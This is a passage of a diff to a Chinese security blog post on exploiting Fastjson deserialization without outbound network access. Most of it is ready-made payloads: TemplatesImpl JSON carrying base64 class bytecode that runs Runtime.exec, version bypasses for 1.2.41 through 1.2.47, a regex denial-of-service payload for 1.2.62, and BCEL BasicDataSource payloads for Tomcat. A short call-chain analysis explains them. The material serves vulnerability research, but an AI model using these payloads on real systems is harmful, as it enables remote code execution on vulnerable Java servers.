+&#39;_name&#39;:&#39;aaa&#39;,
+&#39;_tfactory&#39;:&#123; &#125;,
+&quot;_outputProperties&quot;:&#123; &#125;
+&#125;
+</code></pre>
+<p>@type<br>指定的解析类，这⾥即 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ，Fastjson根据<br>指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在poc中， bytecodes<br>与 _name 都是私有属性，所以要想反序列化这两个，需要在 parseObject() 时设<br>置 Feature.SupportNonPublicField<br>_bytecodes<br>是我们把恶意类的.class⽂件⼆进制格式进⾏base64编码后得到的字符串<br>_outputProperties<br>漏洞利⽤链的关键会调⽤其参数的getOutputProperties⽅法导致命令执⾏<br>_tfactory:{}<br>在defineTransletClasses()时会调⽤getExternalExtensionsMap(),当为null时会报错，所以要对tfactory<br>设值</p>
+<p>1.6 其他版本绕过</p>
+<p>1.2.41</p>
+<pre><code>String PoC=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAARjYWxjCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAWAQAGPGluaXQ+DAAYAAgKABcAGQAhAAIAFwAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABgACAABAAkAAAARAAEAAQAAAAUqtwAasQAAAAAAAQAFAAAAAgAG\&quot;],\&quot;_name\&quot;:\&quot;c\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;outputProperties\&quot;:&#123;&#125;&#125;&quot;;
+</code></pre>
+<p>1.2.47</p>
+<pre><code>String PoC=&quot;&#123;\n&quot; +
+        &quot;    \&quot;1\&quot;:&#123;\n&quot; +
+        &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +
+        &quot;        \&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;\n&quot; +
+        &quot;    &#125;,\n&quot; +
+        &quot;    \&quot;2\&quot;:&#123;\n&quot; +
+        &quot;        \&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +
+        &quot;        \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAARjYWxjCAAQAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAEgATCgALABQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAWAQAGPGluaXQ+DAAYAAgKABcAGQAhAAIAFwAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABgACAABAAkAAAARAAEAAQAAAAUqtwAasQAAAAAAAQAFAAAAAgAG\&quot;],\n&quot; +
+        &quot;        \&quot;_name\&quot;:\&quot;c\&quot;,\n&quot; +
+        &quot;        \&quot;_tfactory\&quot;:&#123;&#125;,\n&quot; +
+        &quot;        \&quot;outputProperties\&quot;:&#123;&#125;\n&quot; +
+        &quot;    &#125;\n&quot; +
+        &quot;&#125;&quot;;
+</code></pre>
+<p>1.2.62 </p>
+<pre><code>&#123;
+    &quot;regex&quot;:&#123;
+        &quot;$ref&quot;:&quot;$[poc rlike &#39;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#39;]&quot;
+    &#125;,
+    &quot;poc&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;
+&#125;
+</code></pre>
+<p>或</p>
+<pre><code>&#123;
+    &quot;regex&quot;:&#123;
+        &quot;$ref&quot;:&quot;$[\poc = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]&quot;
+    &#125;,
+    &quot;poc&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;
+&#125;
+</code></pre>
+<h2 id="0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><h3 id="2-1-利⽤条件"><a href="#2-1-利⽤条件" class="headerlink" title="2.1 利⽤条件"></a>2.1 利⽤条件</h3><ul>
 <li>⽆需⽬标额外开启选项，也不⽤连接外部服务器</li>
 <li>但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar</li>
 <li>对于SpringBoot这种⾃带Tomcat可以直接以单个jar⽂件部署的需要在maven中配置tomcat-dbcp。</li>
-<li>⽽且对于不同的Tomcat版本使⽤的poc也不同：</li>
+<li>⽽且对于不同的Tomcat版本使⽤的poc也不同</li>
 <li>Tomcat 8.0以后使⽤ org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
 <li>Tomcat 8.0以前使⽤ org.apache.tomcat.dbcp.dbcp.BasicDataSource</li>
 <li>JDK版本&lt; 8u251，在Java 8u251以后，bcel类被删除</li>
 </ul>
-<h2 id="2-2-影响版本"><a href="#2-2-影响版本" class="headerlink" title="2.2 影响版本"></a>2.2 影响版本</h2><p>Fastjson 1.2.22-1.2.24</p>
+<h3 id="2-2-影响版本"><a href="#2-2-影响版本" class="headerlink" title="2.2 影响版本"></a>2.2 影响版本</h3><p>Fastjson 1.2.22-1.2.24</p>
 <p>利⽤环境<br>jdk1.8.0_102、fastjson1.2.24、tomcat-dbcp9.0.20</p>
-<h2 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h2><p>POC：</p>
+<h3 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h3><p>POC：</p>
 <pre><code>public class POC&#123;
     static&#123;
         try&#123;
@@ -776,7 +939,7 @@ public class BCEL &#123;
 &#125;
 </code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224093044624.png" alt="image-20211224093044624"></p>
-<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><pre><code>//fastjson&lt;=1.2.24
+<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><pre><code>//fastjson&lt;=1.2.24
 &#123;
     &#123;
         &quot;x&quot;:&#123;
@@ -794,24 +957,61 @@ public class BCEL &#123;
 <p>driverClassLoader</p>
 <p>指定Classloade为com.sun.org.apache.bcel.internal.util.ClassLoader</p>
 <p>driverClassName<br>设置ClassName为 BCEL… 这种格式后，在 newInstance ⽅法执⾏后被实例化。第⼆个参数 initial 为true时，类加载后将会直接执⾏ static{} 块中的代码</p>
-<h2 id="2-4-调试分析"><a href="#2-4-调试分析" class="headerlink" title="2.4 调试分析"></a>2.4 调试分析</h2><p>在 JSON 反序列化的时候，FastJson 会对 JSON Key ⾃动调⽤ toString() ⽅法：</p>
+<h3 id="2-4-调试分析"><a href="#2-4-调试分析" class="headerlink" title="2.4 调试分析"></a>2.4 调试分析</h3><p>这里开发者是用了代码中是调用的是 JSON.parse() 。</p>
+<p>原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 、is等方法。</p>
+<p>首先，在 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。</p>
+<p>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101406330.png" alt="image-20211224101406330"></p>
-<p>经过⼀系列调⽤，⼀步步跟进来到 BasicDataSource 存在⼀个 getConnection</p>
+<p>BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是调用了getConnection方法</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101721116.png" alt="image-20211224101721116"></p>
-<p>继续跟进 getConnection 函数，他主要调⽤ createConnectionFactory</p>
+<p>继续跟进 createDataSource函数，他主要调⽤ createConnectionFactory</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101843513.png" alt="image-20211224101843513"></p>
 <p>跟进可以看到在 createConnectionFactory 函数使⽤ Class.forName 加载类</p>
 <p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211224101905153.png" alt="image-20211224101905153"></p>
-<p>在  Class.forName 时，会触发 static 代码块中的代码，从⽽达到任意代码执⾏的⽬的</p>
-<h2 id="2-4-利用链分析"><a href="#2-4-利用链分析" class="headerlink" title="2.4 利用链分析"></a>2.4 利用链分析</h2><pre><code>--&gt; BasicDataSource.getConnection()
+<p>在  Class.forName 时，会触发 static 代码块中的代码，从⽽达到任意代码执⾏的⽬的。</p>
+<p>当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>
+<p>所以对于 JSON.parseObject()，直接传入这样的Payload也能触发：</p>
+<pre><code>&#123;
+        &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+        &quot;driverClassLoader&quot;: &#123;
+            &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+        &#125;,
+        &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b......&quot;
+&#125;
+</code></pre>
+<h3 id="2-5-利用链"><a href="#2-5-利用链" class="headerlink" title="2.5 利用链"></a>2.5 利用链</h3><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p>
+<pre><code>--&gt; BasicDataSource.getConnection()
 --&gt; createDataSource()
 --&gt; createConnectionFactory()
 --&gt; Class.forName()
 --&gt;...
 --&gt; Runtime.exec()
 </code></pre>
-<p>当Fastjson反序列化 org.apache.tomcat.dbcp.dbcp.BasicDataSource 对象时，⾸先通过 setter ⽅法设<br>置其 driverClassLoader 和 driverClassName 属性，然后会调⽤其 getConnection⽅法 ，⼜最终调⽤了<br>createConnectionFactory ⽅法，其通过 Class.forName ⽅法反射调⽤ driverClassLoader 加<br>载 driverClassName ，并设置是否初始化参数为true，当 Class.forName 第⼆个参数 initial 为true时，<br>类加载后将会直接执⾏static{}块中的代码造成任意代码执⾏。forName⽅法实际最终调⽤了C实现的Native类型的⽅<br>法，分析C源码可知，其底层的加载逻辑仍是调⽤类加载器的loadClass⽅法加载⾃定义类。</p>
-<h2 id="绕过-1-2-36-lt-fastjson-lt-1-2-37"><a href="#绕过-1-2-36-lt-fastjson-lt-1-2-37" class="headerlink" title="绕过 1.2.36&lt;=fastjson&lt;1.2.37"></a>绕过 1.2.36&lt;=fastjson&lt;1.2.37</h2><pre><code>&#123;
+<h3 id="1-2-33-lt-fastjson-lt-12-36"><a href="#1-2-33-lt-fastjson-lt-12-36" class="headerlink" title="1.2.33&lt;=fastjson&lt;=12.36"></a>1.2.33&lt;=fastjson&lt;=12.36</h3><pre><code>&#123;
+    &quot;name&quot;:
+    &#123;
+        &quot;@type&quot; : &quot;java.lang.Class&quot;,
+        &quot;val&quot;   : &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;
+    &#125;,
+    &quot;x&quot; : &#123;
+        &quot;name&quot;: &#123;
+            &quot;@type&quot; : &quot;java.lang.Class&quot;,
+            &quot;val&quot;   : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+        &#125;,
+        &#123;
+            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,
+            &quot;c&quot;: &#123;
+                &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,
+                &quot;driverClassLoader&quot;: &#123;
+                    &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
+                &#125;,
+                &quot;driverClassName&quot;:&quot;$$BCEL...&quot;
+            &#125;
+        &#125; : &quot;ddd&quot;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="1-2-37-lt-fastjson-lt-1-2-47"><a href="#1-2-37-lt-fastjson-lt-1-2-47" class="headerlink" title="1.2.37&lt;=fastjson&lt;=1.2.47"></a>1.2.37&lt;=fastjson&lt;=1.2.47</h3><pre><code>&#123;
     &quot;name&quot;:
     &#123;
         &quot;@type&quot; : &quot;java.lang.Class&quot;,
@@ -829,17 +1029,17 @@ public class BCEL &#123;
                 &quot;driverClassLoader&quot;: &#123;
                     &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;
                 &#125;,
-                &quot;driverClassName&quot;:&quot;$$BCEL$$&quot;+ code+&quot;,
+                &quot;driverClassName&quot;:&quot;$$BCEL$..&quot;,
 
                      &quot;$ref&quot;: &quot;$.x.y.c.connection&quot;
-
             &#125;
         &#125;
     &#125;
 &#125;
 </code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>参考链接：</p>
-<p>P牛知识星球-Java漫谈</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1730722">https://cloud.tencent.com/developer/article/1730722</a></p>
+<p><a target="_blank" rel="noopener" href="https://c014.cn/blog/java/Fastjson/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E5%8E%86%E5%8F%B2%E7%BA%BF.html#1241-%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90">https://c014.cn/blog/java/Fastjson/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E5%8E%86%E5%8F%B2%E7%BA%BF.html#1241-%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -854,10 +1054,10 @@ public class BCEL &#123;
 
 <div class="article_copyright">
     <p><span class="copy-title">Title:</span>Java反序列化-Fastjson不出网利用</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">1.3k</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">2.7k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-18, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-24, 10:48:28</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-30, 16:45:59</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" title="Java反序列化-Fastjson不出网利用">http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
